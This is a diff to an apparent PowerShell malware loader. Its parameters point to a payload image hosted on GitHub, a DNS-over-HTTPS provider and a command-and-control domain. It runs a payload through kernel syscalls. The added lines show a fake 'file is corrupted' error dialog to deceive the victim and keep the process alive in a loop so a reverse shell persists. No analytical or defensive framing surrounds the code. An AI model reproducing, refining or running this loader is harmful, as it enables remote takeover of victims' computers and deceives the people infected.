@@ -14,7 +14,7 @@
 #>
 
 param(
-    [string]$ImageUrl = "https://raw.githubusercontent.com/rootcpanel-yoe/313/refs/heads/main/evil.png",
+    [string]$ImageUrl = "https://raw.githubusercontent.com/rootcpanel-yoe/313/main/evil.png",
     [string]$DohProvider = "https://cloudflare-dns.com/dns-query",
     [string]$C2Domain = "bib0rn.myvnc.com"
 )
@@ -259,6 +259,14 @@ if ($c2Instruction -match "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}") {
         try {
             [SyscallBridge]::Execute($realPayload)
             Write-Host "[+] Payload executed via Kernel Syscalls" -ForegroundColor Green
+            
+            # 4. Fake Error Message (Social Engineering)
+            # Pops up AFTER payload injection. Blocks main thread until clicked, keeping process alive.
+            Add-Type -AssemblyName System.Windows.Forms
+            [System.Windows.Forms.MessageBox]::Show("The file is corrupted and cannot be opened.", "Document Error", 'OK', 'Error') | Out-Null
+            
+            # 5. Keep-Alive Loop (Ensures Reverse Shell thread doesn't die when script finishes)
+            while($true) { Start-Sleep -Seconds 60 }
         } catch {
             Write-Error "[-] Execution failed: $_"
         }
